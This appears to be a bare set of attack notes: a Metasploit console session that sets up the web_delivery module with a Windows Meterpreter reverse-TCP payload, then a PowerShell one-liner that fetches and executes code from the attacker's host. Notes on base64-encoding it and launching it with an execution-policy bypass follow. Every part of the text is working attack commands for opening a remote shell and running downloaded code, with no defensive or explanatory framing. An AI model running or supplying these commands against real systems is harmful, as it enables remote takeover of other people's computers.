
    msf > use exploit/multi/script/web_delivery
    
    msf exploit(web_delivery) > set target 2
    target => 2

    msf exploit(web_delivery) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp

    msf exploit(web_delivery) > set lhost 192.168.1.101
    lhost => 192.168.1.101
    
    msf exploit(web_delivery) > set lport 6666
    lport => 6666

    msf exploit(web_delivery) > set SRVPORT 8081
    SRVPORT => 8081

    msf exploit(web_delivery) > set uripath /
    uripath => /
    
    msf exploit(web_delivery) > exploit
    
`powershell Exec  in 1.txt`
  
    $n=new-object net.webclient;

    $n.proxy=[Net.WebRequest]::GetSystemWebProxy();

    $n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
    
    IEX $n.downloadstring('http://192.168.1.101:8081/');
    
    cat 1.txt | iconv --to-code UTF-16LE |base64
    
    `Exec (Must add ==)`
    
    powershell -ep bypass -enc  "PaYloAD=="  
